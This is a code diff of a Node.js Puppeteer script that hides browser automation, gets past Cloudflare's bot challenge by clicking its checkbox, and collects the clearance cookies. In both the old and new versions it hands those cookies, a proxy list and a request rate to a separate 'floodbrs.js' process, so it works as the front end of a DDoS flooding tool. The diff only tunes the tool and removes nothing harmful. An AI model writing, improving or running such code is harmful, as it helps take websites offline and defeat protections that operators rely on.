@@ -1,7 +1,6 @@
 const fs = require('fs');
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
-const async = require('async');
 const { spawn, exec } = require('child_process');
 
 puppeteer.use(StealthPlugin());
@@ -14,14 +13,18 @@ const COLORS = {
     RESET: '\x1b[0m'
 };
 
-// Stealth configuration
+// Enhanced stealth configuration
 const applyStealth = async (page) => {
     await page.evaluateOnNewDocument(() => {
-        Object.defineProperty(navigator, 'webdriver', { get: () => false });
-        Object.defineProperty(navigator, 'plugins', { 
-            get: () => [1, 2, 3, 4, 5] 
+        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+        Object.defineProperty(navigator, 'plugins', {
+            get: () => [1, 2, 3, 4, 5]
         });
         
+        Object.defineProperty(navigator, 'languages', {
+            get: () => ['en-US', 'en']
+        });
+
         window.chrome = {
             runtime: {},
             loadTimes: () => ({}),
@@ -29,6 +32,7 @@ const applyStealth = async (page) => {
             app: { isInstalled: false }
         };
 
+        // Remove automation traces
         delete window.__webdriver_evaluate;
         delete window.__selenium_evaluate;
         delete window.__webdriver_script_function;
@@ -49,96 +53,74 @@ const getBrowserArgs = () => [
     '--window-size=1920,1080'
 ];
 
-// Cloudflare Solver
+// CLOUDFLARE SOLVER - FOLLOW THE EXACT FLOW
 const solveCloudflare = async (page, proxy, targetURL) => {
     log('INFO', `Processing ${maskProxy(proxy)}`, 'BLUE');
     
-    // Initial wait
-    await sleep(12);
+    // Wait for initial page load
+    await sleep(3);
     
     let title = await page.title().catch(() => '');
-    let currentUrl = page.url();
     
-    // Check if challenge passed
+    // Check if already passed
     if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
         log('SUCCESS', 'Challenge passed', 'GREEN');
         return { solved: true };
     }
 
-    log('INFO', 'Solving challenge...', 'YELLOW');
+    log('INFO', 'Challenge detected - Waiting for verification...', 'YELLOW');
 
-    // Strategy 1: Wait for auto-solve
-    await sleep(18);
-    title = await page.title().catch(() => '');
-    if (!title.includes('Just a moment')) {
-        log('SUCCESS', 'Challenge passed', 'GREEN');
-        return { solved: true };
-    }
+    // Wait for the "Verifying..." phase (10-15 seconds)
+    log('INFO', 'Waiting for Verifying... (12 seconds)', 'YELLOW');
+    await sleep(12);
 
-    // Strategy 2: Interact with challenge iframe
-    try {
-        const frames = await page.frames();
-        for (const frame of frames) {
+    // Look for the checkbox in all frames
+    let checkboxClicked = false;
+    const frames = await page.frames();
+    
+    for (const frame of frames) {
+        try {
             const frameUrl = frame.url();
             if (frameUrl.includes('challenges.cloudflare.com') || frameUrl.includes('/cdn-cgi/')) {
                 log('INFO', 'Found challenge frame', 'YELLOW');
                 
-                const challengeSelectors = [
+                // Look for checkbox
+                const checkboxSelectors = [
                     'input[type="checkbox"]',
-                    '.cf-challenge-checkbox', 
-                    'button',
-                    'input[type="submit"]',
-                    '.btn',
-                    '[role="checkbox"]'
+                    '.cf-challenge-checkbox',
+                    '[role="checkbox"]',
+                    '#cf-challenge-checkbox',
+                    '.hcaptcha-checkbox'
                 ];
                 
-                for (const selector of challengeSelectors) {
+                for (const selector of checkboxSelectors) {
                     const element = await frame.$(selector);
                     if (element) {
-                        await element.click().catch(() => {});
-                        log('INFO', `Clicked: ${selector}`, 'YELLOW');
-                        await sleep(15);
-                        break;
+                        const isVisible = await element.isIntersectingViewport();
+                        if (isVisible) {
+                            log('INFO', `Found checkbox: ${selector}`, 'YELLOW');
+                            
+                            // Click with human-like delay
+                            await element.click({ delay: 100 }).catch(() => {});
+                            log('INFO', 'Clicked checkbox', 'GREEN');
+                            checkboxClicked = true;
+                            
+                            // Wait for completion
+                            await sleep(15);
+                            break;
+                        }
                     }
                 }
-                
-                title = await page.title().catch(() => '');
-                if (!title.includes('Just a moment')) {
-                    log('SUCCESS', 'Challenge passed', 'GREEN');
-                    return { solved: true };
-                }
+                break;
             }
+        } catch (error) {
+            // Continue
         }
-    } catch (error) {
-        // Continue to next strategy
     }
 
-    // Strategy 3: Page refresh
-    log('INFO', 'Refreshing page...', 'YELLOW');
-    await page.reload({ waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
-    await sleep(15);
-    
+    // Check if passed
     title = await page.title().catch(() => '');
-    if (!title.includes('Just a moment')) {
-        log('SUCCESS', 'Challenge passed', 'GREEN');
-        return { solved: true };
-    }
-
-    // Strategy 4: Direct navigation
-    log('INFO', 'Trying direct navigation...', 'YELLOW');
-    await page.setExtraHTTPHeaders({
-        'Referer': 'https://www.google.com/'
-    });
-    
-    await page.goto(targetURL, { 
-        waitUntil: 'networkidle0', 
-        timeout: 45000 
-    }).catch(() => {});
-    
-    await sleep(12);
-    title = await page.title().catch(() => '');
-    
-    if (!title.includes('Just a moment')) {
+    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
         log('SUCCESS', 'Challenge passed', 'GREEN');
         return { solved: true };
     }
@@ -147,90 +129,50 @@ const solveCloudflare = async (page, proxy, targetURL) => {
     return { solved: false };
 };
 
-// EXTRACT ALL COOKIES FROM TARGET WEBSITE
-const extractAllCookies = async (page, targetURL) => {
+// EXTRACT ONLY CLOUDFLARE COOKIES
+const extractCloudflareCookies = async (page, targetURL) => {
     await sleep(5);
     
-    let allCookies = [];
-    let cookieString = '';
+    // Get ALL cookies from browser
+    const allCookies = await page.cookies().catch(() => []);
     
-    // Try multiple extraction methods
-    const extractionMethods = [
-        // Method 1: Target domain cookies
-        async () => {
-            const cookies = await page.cookies(targetURL).catch(() => []);
-            if (cookies.length > 0) {
-                log('COOKIES', `Domain cookies: ${cookies.length}`, 'GREEN');
-                return cookies;
-            }
-            return [];
-        },
-        
-        // Method 2: All cookies from browser
-        async () => {
-            const cookies = await page.cookies().catch(() => []);
-            if (cookies.length > 0) {
-                log('COOKIES', `All cookies: ${cookies.length}`, 'GREEN');
-                return cookies;
-            }
-            return [];
-        },
-        
-        // Method 3: Wait and retry domain cookies
-        async () => {
-            await sleep(3);
-            const cookies = await page.cookies(targetURL).catch(() => []);
-            if (cookies.length > 0) {
-                log('COOKIES', `Retry cookies: ${cookies.length}`, 'GREEN');
-                return cookies;
-            }
-            return [];
-        }
-    ];
-    
-    // Try all extraction methods
-    for (const method of extractionMethods) {
-        try {
-            const cookies = await method();
-            if (cookies.length > 0) {
-                allCookies = cookies;
-                cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
-                break;
-            }
-        } catch (error) {
-            // Continue to next method
-        }
-    }
-    
-    // Log all cookie names found
-    if (allCookies.length > 0) {
-        const cookieNames = allCookies.map(c => c.name).join(', ');
-        log('COOKIES', `Found: ${cookieNames}`, 'GREEN');
-        
-        // Check for specific important cookies
-        const importantCookies = ['cf_clearance', 'session', 'token', 'auth', 'login'];
-        const foundImportant = allCookies.filter(c => 
-            importantCookies.some(important => c.name.toLowerCase().includes(important))
-        );
-        
-        if (foundImportant.length > 0) {
-            const importantNames = foundImportant.map(c => c.name).join(', ');
-            log('COOKIES', `Important: ${importantNames}`, 'GREEN');
-        }
-    } else {
+    if (allCookies.length === 0) {
         log('COOKIES', 'No cookies found', 'YELLOW');
+        return { cookies: '', count: 0, names: [] };
     }
+
+    // Filter ONLY Cloudflare cookies
+    const cloudflareCookies = allCookies.filter(cookie => 
+        cookie.name.includes('cf_') ||
+        cookie.name.includes('__cf') ||
+        cookie.domain.includes('cloudflare')
+    );
+
+    // Log what we found
+    log('COOKIES', `Total cookies found: ${allCookies.length}`, 'GREEN');
     
-    return {
-        cookies: cookieString,
-        cookieCount: allCookies.length,
-        cookieNames: allCookies.map(c => c.name)
-    };
+    if (cloudflareCookies.length > 0) {
+        const cloudflareNames = cloudflareCookies.map(c => c.name).join(', ');
+        log('COOKIES', `Cloudflare cookies: ${cloudflareNames}`, 'BLUE');
+        
+        // Create cookie string from ONLY Cloudflare cookies
+        const cookieString = cloudflareCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
+
+        return {
+            cookies: cookieString,
+            count: cloudflareCookies.length,
+            names: cloudflareCookies.map(c => c.name)
+        };
+    } else {
+        log('COOKIES', 'No Cloudflare cookies found', 'YELLOW');
+        return { cookies: '', count: 0, names: [] };
+    }
 };
 
 // Command-line setup
 if (process.argv.length < 6) {
-    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
+    console.log('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
+    console.log('Example: node browser.js https://example.com 1 proxies.txt 10 120');
     process.exit(1);
 }
 
@@ -241,7 +183,6 @@ const rate = process.argv[5];
 const duration = parseInt(process.argv[6]);
 
 let successCount = 0;
-let totalCount = 0;
 
 // Utility functions
 const generateRandomString = (length) => {
@@ -253,7 +194,8 @@ const validKey = generateRandomString(12);
 
 const readProxies = (filePath) => {
     try {
-        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
+        const proxies = fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
+        return [proxies[0]]; // Only use first proxy for testing
     } catch (error) {
         log('ERROR', 'Cannot read proxy file', 'RED');
         return [];
@@ -283,9 +225,7 @@ const randomElement = (array) => array[Math.floor(Math.random() * array.length)]
 // User agents
 const userAgents = [
     `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
-    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36`,
-    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
-    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`
+    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`
 ];
 
 // Browser launcher
@@ -294,7 +234,7 @@ const launchBrowser = async (targetURL, proxy, attempt = 1) => {
     let browser;
 
     const options = {
-        headless: true,
+        headless: false, // Set to true for production
         args: [
             `--user-agent=${userAgent}`,
             ...getBrowserArgs()
@@ -307,7 +247,6 @@ const launchBrowser = async (targetURL, proxy, attempt = 1) => {
     };
 
     try {
-        totalCount++;
         log('LAUNCH', `Attempt ${attempt} for ${maskProxy(proxy)}`, 'BLUE');
         
         browser = await puppeteer.launch(options);
@@ -315,10 +254,12 @@ const launchBrowser = async (targetURL, proxy, attempt = 1) => {
 
         await applyStealth(page);
 
+        log('NAVIGATE', `Going to: ${targetURL}`, 'BLUE');
+        
         // Navigate to target
         await page.goto(targetURL, { 
             waitUntil: 'networkidle0', 
-            timeout: 45000 
+            timeout: 60000 
         }).catch(() => {});
 
         // Solve Cloudflare challenge
@@ -328,19 +269,24 @@ const launchBrowser = async (targetURL, proxy, attempt = 1) => {
             throw new Error('Cloudflare challenge failed');
         }
 
-        // Extract ALL cookies from the website
-        const cookieResult = await extractAllCookies(page, targetURL);
+        // Extract ONLY Cloudflare cookies
+        const cookieResult = await extractCloudflareCookies(page, targetURL);
         
         successCount++;
-        log('STATS', `Success: ${successCount}/${totalCount} | Cookies: ${cookieResult.cookieCount}`, 'GREEN');
+        
+        if (cookieResult.count > 0) {
+            log('SUCCESS', `Solved! Cloudflare cookies: ${cookieResult.count} (${cookieResult.names.join(', ')})`, 'GREEN');
+        } else {
+            log('WARNING', 'Solved but no Cloudflare cookies found', 'YELLOW');
+        }
 
         await browser.close();
 
         return {
-            cookies: cookieResult.cookies,
+            cookies: cookieResult.cookies, // ONLY Cloudflare cookies
             userAgent: userAgent,
-            cookieCount: cookieResult.cookieCount,
-            cookieNames: cookieResult.cookieNames
+            cookieCount: cookieResult.count,
+            cookieNames: cookieResult.names
         };
 
     } catch (error) {
@@ -352,48 +298,8 @@ const launchBrowser = async (targetURL, proxy, attempt = 1) => {
             return launchBrowser(targetURL, proxy, attempt + 1);
         }
         
-        log('FAILED', `${maskProxy(proxy)}`, 'RED');
+        log('FAILED', `${maskProxy(proxy)} - ${error.message}`, 'RED');
         return null;
-    }
-};
-
-// Thread handler
-const processProxy = async (targetURL, proxy, task, done) => {
-    try {
-        const result = await launchBrowser(targetURL, proxy);
-        
-        if (result) {
-            // Log hasil cookies yang didapat
-            if (result.cookieCount > 0) {
-                log('RESULT', `Proxy ${maskProxy(proxy)} - ${result.cookieCount} cookies: ${result.cookieNames.join(', ')}`, 'GREEN');
-            }
-            
-            // Launch flood process dengan semua cookies
-            try {
-                const floodProcess = spawn('node', [
-                    'floodbrs.js',
-                    targetURL,
-                    duration.toString(),
-                    rate,
-                    threads.toString(),
-                    proxyFile,
-                    result.cookies,
-                    result.userAgent,
-                    validKey
-                ], {
-                    detached: true,
-                    stdio: 'ignore'
-                });
-                floodProcess.unref();
-                log('FLOOD', 'Process started', 'GREEN');
-            } catch (error) {
-                log('ERROR', 'Failed to start flood', 'RED');
-            }
-        }
-
-        done(null, { task });
-    } catch (error) {
-        done(null, { task });
     }
 };
 
@@ -407,27 +313,49 @@ const main = async () => {
     }
 
     log('START', `Target: ${targetURL}`, 'GREEN');
-    log('INFO', `Proxies: ${proxies.length} | Threads: ${threads} | Time: ${duration}s`, 'BLUE');
+    log('INFO', `Using 1 proxy for testing | Threads: ${threads} | Time: ${duration}s`, 'BLUE');
 
-    // Process proxies dengan concurrency control
-    const queue = async.queue((task, done) => {
-        processProxy(targetURL, task.proxy, task, done);
-    }, threads);
-
-    proxies.forEach(proxy => {
-        queue.push({ proxy });
-    });
-
-    queue.drain(() => {
-        log('COMPLETE', `Finished - Success: ${successCount}/${totalCount}`, 'GREEN');
-    });
-
-    // Auto shutdown setelah duration
-    setTimeout(() => {
-        log('INFO', 'Time limit reached - Shutting down', 'YELLOW');
-        queue.kill();
-        process.exit(0);
-    }, duration * 1000);
+    // Process only the first proxy
+    const proxy = proxies[0];
+    
+    try {
+        const result = await launchBrowser(targetURL, proxy);
+        
+        if (result && result.cookies) {
+            log('RESULT', `Proxy ${maskProxy(proxy)} - Sending ${result.cookieCount} Cloudflare cookies to flood`, 'GREEN');
+            
+            // Launch flood process with ONLY Cloudflare cookies
+            try {
+                log('FLOOD', `Starting flood process with rate ${rate} for ${duration}s`, 'GREEN');
+                const floodProcess = spawn('node', [
+                    'floodbrs.js',
+                    targetURL,
+                    duration.toString(),
+                    rate,
+                    threads.toString(),
+                    proxyFile,
+                    result.cookies, // ONLY Cloudflare cookies
+                    result.userAgent,
+                    validKey
+                ], {
+                    detached: false,
+                    stdio: 'inherit'
+                });
+                
+                floodProcess.on('close', (code) => {
+                    log('FLOOD', `Process completed`, 'YELLOW');
+                    process.exit(0);
+                });
+                
+            } catch (error) {
+                log('ERROR', `Failed to start flood: ${error.message}`, 'RED');
+            }
+        } else {
+            log('ERROR', 'No Cloudflare cookies obtained', 'RED');
+        }
+    } catch (error) {
+        log('ERROR', error.message, 'RED');
+    }
 };
 
 // Error handling
@@ -444,7 +372,7 @@ process.on('SIGINT', () => {
     process.exit(0);
 });
 
-log('READY', 'Cloudflare Solver Started - All Cookies Extraction', 'GREEN');
+log('READY', 'Cloudflare Solver Started - Sending ONLY Cloudflare Cookies to Flood', 'GREEN');
 main().catch(error => {
     log('ERROR', error.message, 'RED');
     process.exit(1);
